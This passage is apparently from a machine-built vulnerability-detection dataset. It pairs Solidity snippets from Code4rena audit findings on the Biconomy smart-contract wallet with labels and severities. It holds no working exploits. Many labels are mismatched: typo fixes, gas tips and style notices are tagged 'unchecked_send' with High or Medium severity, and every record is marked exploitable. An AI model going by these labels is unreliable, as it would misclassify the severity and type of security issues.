    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " function returns false is an externally-owned account (EOA) and not a contract. Among others, ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description",
    "description": "It is unsafe to assume that an address for which ```isContract``` function returns false is an externally-owned account (EOA) and not a contract. Among others, ```isContract``` will return false for the following types of addresses: - an externally-owned account - a contract in construction - an address where a contract will be created - an address where a contract lived, but was destroyed",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.095,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L10) => ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Instances",
    "description": "- [```// Domain Seperators```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L38) => ```Separators``` - [```// We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L228) => ```subtract``` - [```/// @param targetTxGas Fas that should be used for the safe transaction.```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L382) => ```Gas``` - [```// 0xa9059cbb - keccack(\"transfer(address,uint256)\")```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol#L15) => ```keccak``` - [```* - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field.```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L10) => ```validate```",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.155,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " solidity\ncontracts/SmartAccount.sol\n257:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n258:         if (gasToken == address(0)) {\n259:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n260:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n261:             (bool success,) = receiver.call{value: payment}(\"\");\n262:             require(success, \"BSA011\");\n263:         } else {\n264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n265:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n266:         }\n\n\n281:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n282:         if (gasToken == address(0)) {\n283:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n284:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n285:             (bool success,) = receiver.call{value: payment}(\"\");\n286:             require(success, \"BSA011\");\n287:         } else {\n288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n289:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n290:         }\n\n511:         require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n512:         return 0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "### [L-1] Dont use tx.origin and tx.gasprice",
    "description": "Consider tx.origin and tx.gasprice is a global variable in Solidity that returns the address of the account that sent the transaction. Using the variable could make a contract vulnerable if an authorized account calls a malicious contract impersonate a user using a third party contract. contracts/SmartAccount.sol 257:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver; 258:         if (gasToken == address(0)) { 259:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " solidity\ncontracts\\libs\\MultiSend.sol\n26:  function multiSend(bytes memory transactions) public payable {\ncontracts\\libs\\MultiSendCallOnly.sol\n21:     function multiSend(bytes memory transactions) public payable {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-2] Consider an ether lockout may occur in the function",
    "description": "If the summoner sends ether to this contract, then the ether will be locked in the contract and cannot be retrieved, which can lead to an ether lock Remove the payable attribute or add a withdraw function. contracts\\libs\\MultiSend.sol 26:  function multiSend(bytes memory transactions) public payable { contracts\\libs\\MultiSendCallOnly.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.215,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " solidity \ncontracts\\aa-4337\\core\\EntryPoint.sol\n48: function _executeUserOp(uint256 opIndex, UserOperation calldata userOp, UserOpInfo memory opInfo) private returns (uint256 collected) {\n52:         try this.innerHandleOp(userOp.callData, opInfo, context) returns (uint256 _actualGasCost) {\n459:                  catch Error(string memory reason) {\n289:     function _validateAccountPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, address aggregator, uint256 requiredPrefund)\n290:     internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) {\n289:     function _validateAccountPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, address aggregator, uint256 requiredPrefund)\n290:     internal returns (uint256 gasUsedByValidateAccountPrepayment, address actualAggregator, uint256 deadline) {\n319:  try IAccount(sender).validateUserOp{gas : mUserOp.verificationGasLimit}(op, opInfo.userOpHash, aggregator, missingAccountFunds) returns (uint256 _deadline) {\n325:    } catch Error(string memory revertReason) {\n307:      try IAggregatedAccount(sender).getAggregator() returns (address userOpAggregator) {\n349: function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {\n363:         try IPaymaster(paymaster).validatePaymasterUserOp{gas : gas}(op, opInfo.userOpHash, requiredPreFund) returns (bytes memory _context, uint256 _deadline){\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-3] Consider the unused return value",
    "description": "While not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity: Using both named returns and a return statement isn't necessary. Removing unused named return variables can reduce gas usage and improve code clarity. To save gas and improve code quality: consider using only one of those. contracts\\aa-4337\\core\\EntryPoint.sol 48: function _executeUserOp(uint256 opIndex, UserOperation calldata userOp, UserOpInfo memory opInfo) private returns (uint256 collected) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " solidity\npragma solidity ^0.8.12;\npragma solidity ^0.8.4;\npragma solidity ^0.8.9;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-5] Mixing and Outdated compiler",
    "description": "The pragma version used are: pragma solidity ^0.8.12; pragma solidity ^0.8.4; pragma solidity ^0.8.9; Note that mixing pragma is not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.083,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " solidity\ncontracts\\BaseSmartAccount.sol\n106:     function _payPrefund(uint256 missingAccountFunds) internal virtual {\n107:         if (missingAccountFunds != 0) {\n108:             (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");\n109:           --    (success);\n ++ example require(success, \"Failed\");\n110:             //ignore failure (its EntryPoint's job to verify, not account.)\n111:         }\n112:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-6] consider validating Functions that send to arbitrary destinations",
    "description": "EG then if calling the call method fails (success = false), then the function will raise an exception with the message \"Failed\". This exception can be handled with a block catch in the function that calls _payPrefund to handle delivery failures contracts\\BaseSmartAccount.sol 106:     function _payPrefund(uint256 missingAccountFunds) internal virtual { 107:         if (missingAccountFunds != 0) { 108:             (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.463,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "VerifyingSingletonPaymaster.depositFor()",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Low Risk",
    "description": "|      | Issue                                                                                       | |------|---------------------------------------------------------------------------------------------| | L-01 | `SmartAccountFactory.deployWallet` does not fully comply with EIP-4337                      | | L-02 | Wrong error string                                                                          | | L-03 | The \"no smart contract\" check in `VerifyingSingletonPaymaster.depositFor()` can be bypassed |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.04,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nThe wallet creation itself is done by a \u201cfactory\u201d contract, with wallet-specific data.\nThe factory is expected to use CREATE2 (not CREATE) to create the wallet, so that the order of creation of wallets doesn\u2019t interfere with the generated addresses\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L\u201101] `SmartAccountFactory.deployWallet` does not fully comply with EIP-4337",
    "description": "This function uses [CREATE](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L57) to deploy the account. As per [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#first-time-account-creation): The wallet creation itself is done by a \u201cfactory\u201d contract, with wallet-specific data. The factory is expected to use CREATE2 (not CREATE) to create the wallet, so that the order of creation of wallets doesn\u2019t interfere with the generated addresses Consider removing this function, as `deployCounterFactualWallet()` already allows creation of wallets.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.25,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " does not have any 0 padding. This saves the total bytes in the deploy code and therefore saves deploy time cost, at the expense of extra 6 gas during runtime. This means that shorter revert strings saves deploy time costs of the contract. Note that this kind of saving is not relevant for high values of --optimize-runs as ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "\u2705 Recommendation",
    "description": "Consider the following require statement: // condition is boolean // str is a string require(condition, str) The string str is split into 32-byte sized chunks and then stored in `memory` using `mstore`, then the `memory` offsets are provided to `revert(offset, length)`. For chunks shorter than 32 bytes, and for low --optimize-runs value (usually even the default value of 200), instead of `push32 val`, where `val` is the 32 byte hexadecimal representation of the string with 0 padding on the least significant bits, the solidity compiler replaces it by `shl(value, short-value))`. Where `short-value` does not have any 0 padding. This saves the total bytes in the deploy code and therefore saves deploy time cost, at the expense of extra 6 gas during runtime. This means that shorter revert strings saves deploy time costs of the contract. Note that this kind of saving is not relevant for high values of --optimize-runs as `push32 value` will not be replaced by a `shl(..., ...)` equivalent by the Solidity compiler.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.324,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nIn this example, the for loop post condition, i.e., `i++` involves checked arithmetic, which is not required. This is because the value of i is always strictly less than `length <= 2**256 - 1`. Therefore, the theoretical maximum value of i to enter the for-loop body `is 2**256 - 2`. This means that the `i++` in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler.\n\nUnfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. You should manually do this by:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Description",
    "description": "In Solidity 0.8+, there\u2019s a default overflow check on unsigned integers. It\u2019s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck [cannot be made inline](https://github.com/ethereum/solidity/issues/10695). Example for loop: for (uint i = 0; i < length; i++) { // do something that doesn't change the value of i }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.539,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2)",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Description",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2)`, which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost. Please check out this [article](https://coinsbench.com/solidity-payable-vs-regular-functions-a-gas-usage-comparison-b4a387fe860d)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.095,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Solidity\ncontract Requires {\nuint256 public gas;\n\t\t\t\n\t\t\t\tfunction check1(uint x) public {\n\t\t\t\t\tgas = gasleft();\n\t\t\t\t\trequire(x == 0 && x < 1 ); // gas cost 22156\n\t\t\t\t\tgas -= gasleft();\n\t\t\t\t}\n\t\t\t\n\t\t\t\tfunction check2(uint x) public {\n\t\t\t\t\tgas = gasleft();\n\t\t\t\t\trequire(x == 0); // gas cost 22148\n\t\t\t\t\trequire(x < 1);\n\t\t\t\t\tgas -= gasleft();\n\t}\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Description",
    "description": "Usage of double require will save you around 10 gas with the optimizer enabled. See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper. Example: contract Requires { uint256 public gas;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.343,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    function init(\n        address _owner,\n        address _entryPointAddress,\n        address _handler\n    ) public override initializer {\n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0), \"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint = IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-02] INIT() FUNCTION CAN BE CALLED BY ANYBODY",
    "description": "The `init()` function can be called by anybody when the contract is not initialized. function init( address _owner, address _entryPointAddress, address _handler",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.691,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "execFromEntryPoint ()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[N-04] MISSING EVENTS FOR CRITICAL OPERATIONS",
    "description": "Several critical operations do not trigger events. As a result, it isn't easy to check the behavior of the contracts. Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Ideally, the following critical operations should trigger events: - [`addDeposit()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L525) - [`withdrawDepositTo()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536) - [`transfer()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449) - [`pullTokens() `](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount: \n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {   \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N-05] LINES ARE TOO LONG",
    "description": "Usually, lines in source code are limited to 80 characters. Reference: https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length contracts/smart-contract-wallet/SmartAccount: function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.231,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n100: for (uint256 i = 0; i < opasLen; i++) {\n107: for (uint256 a = 0; a < opasLen; a++) {\n112: for (uint256 i = 0; i < opslen; i++) {\n128: for (uint256 a = 0; a < opasLen; a++) {\n134: for (uint256 i = 0; i < opslen; i++) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "G-01 Increments can be unchecked",
    "description": "In Solidity 0.8+, there\u2019s a default overflow check on unsigned integers. It\u2019s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline Prior to Solidity 0.8.0, arithmetic operations would always wrap in case of under- or overflow leading to widespread use of libraries that introduce additional checks. Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary. To obtain the previous behaviour, an unchecked block can be used. It saves **30-40 gas** per loop. _There are 5 instances of this issue_",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.291,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/libs/Math.sol\n\n121: inverse *= 2 - denominator * inverse;\n122: inverse *= 2 - denominator * inverse;\n123: inverse *= 2 - denominator * inverse;\n124: inverse *= 2 - denominator * inverse;\n125:\u00a0inverse *= 2 - denominator * inverse;\n126: inverse *= 2 - denominator * inverse;\n148: result += 1;\n210: result += 128;\n214: result += 64;\n218: result += 32;\n222: result += 16;\n226: result += 8;\n230: result += 4;\n234: result += 2;\n237: result += 1;\n262: value /= 10**64;\n263: result += 64;\n266: value /= 10**32;\n267: result += 32;\n270: value /= 10**16;\n271: result += 16;\n274: value /= 10**8;\n275: result += 8;\n278: value /= 10**4;\n279: result += 4;\n282: value /= 10**2;\n283: result += 2;\n286: result += 1;\n314: result += 16;\n318: result += 8;\n322: result += 4;\n326: result += 2;\n329: result += 1;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-02 x += y costs more gas than x = x + y for state variables (same applies for x -= y , x = x - y ; x \\*=y ; x /= y)",
    "description": "Using the addition operator instead of plus-equals saves\u00a0**[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**. _There are 40 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 81: collected += _executeUserOp(i, ops[i], opInfos[i]);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 37,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.828,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/base/ModuleManager.sol\n\n34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n49: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n68: require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\")\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-03 Splitting require() statements that use && saves gas",
    "description": "See\u00a0[this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128)\u00a0which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by\u00a0**3 gas _There are 3 instance of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol File: contracts/smart-contract-wallet/base/ModuleManager.sol 34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.304,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n203: function _copyUserOpToMemory(UserOperation calldata userOp, MemoryUserOp memory mUserOp) internal pure {\n248: function _getRequiredPrefund(MemoryUserOp memory mUserOp) internal view returns (uint256 requiredPrefund) {\n261: function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {\n289: function _validateAccountPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, address aggregator, uint256 requiredPrefund)\n349: function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {\n496: function min(uint256 a, uint256 b) internal pure returns (uint256) {\n500: function getOffsetOfMemoryBytes(bytes memory data) internal pure returns (uint256 offset) {\n504: function getMemoryBytesFromOffset(uint256 offset) internal pure returns (bytes memory data) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-04 Internal functions only called once can be inlined to save gas",
    "description": "Not inlining costs **20 to 40 gas** because of two extra\u00a0`JUMP`\u00a0instructions and additional stack operations needed for function calls. _There are 27 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol File: contracts/smart-contract-wallet/BaseSmartAccount.sol 73: function _requireFromEntryPoint() internal virtual view {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol\n\n24: function paymasterContext(\n34: function decodePaymasterData(UserOperation calldata op) internal pure returns (PaymasterData memory) {\n43: function decodePaymasterContext(bytes memory context) internal pure returns (PaymasterContext memory) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-05 Not using the named return variables when a functions returns,wastes deployment gas",
    "description": "_There are 8 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol File: contracts/smart-contract-wallet/SmartAccount.sol 506: function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address) https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
